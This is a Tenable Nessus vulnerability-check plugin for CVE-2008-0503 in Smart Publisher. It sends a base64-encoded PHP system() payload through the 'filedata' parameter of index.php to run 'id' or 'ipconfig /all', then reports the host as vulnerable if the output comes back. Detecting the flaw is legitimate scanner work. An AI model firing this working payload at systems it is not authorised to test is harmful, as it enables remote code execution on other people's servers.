#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(30124);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2008-0503");
  script_bugtraq_id(27488);
  script_osvdb_id(40780);
  script_xref(name:"EDB-ID", value:"5003");

  script_name(english:"Smart Publisher index.php filedata Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using Smart Publisher");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Smart Publisher, an open source application
for website publishing. 

The version of Smart Publisher on the remote host fails to sanitize
input to the 'filedata' parameter of the 'index.php' script before
using it in an 'eval()' statement in the 'admin/op/disp.php' script to
evaluate PHP code.  An unauthenticated, remote attacker can leverage
this issue to execute arbitrary code on the remote host subject to the
privileges of the web server user id." );
  # http://sourceforge.net/project/shownotes.php?release_id=581523&group_id=170151
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0ab01de3" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Smart Publisher 1.0.2 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');
 script_cwe_id(94);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/29");
 script_cvs_date("$Date: 2016/05/19 18:02:18 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:netwerk:smart_publisher");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

os = get_kb_item("Host/OS");
if (os && "Windows" >!< os) cmd = "id";
else cmd = "ipconfig /all";


# Loop through directories.
dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to run a command.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "op=disp&",
      "filedata=", base64(str:string("system('", cmd, "');"))
    ), 
    port:port,
    add_headers: make_array("Direct Browser", "1")
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If...
  if (
    # It's Smart Publisher and...
    "<TITLE>Smart Publisher" >< res &&
    # we get some command output
    (
      ("ipconfig" >< cmd && "Subnet Mask" >< res) ||
      ("id" == cmd && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
    )
  )
  {
    output = res - strstr(res, "<HTML");

    if (report_verbosity && strlen(output))
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote\n",
        "host to produce the following results :\n",
        "\n",
        output
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
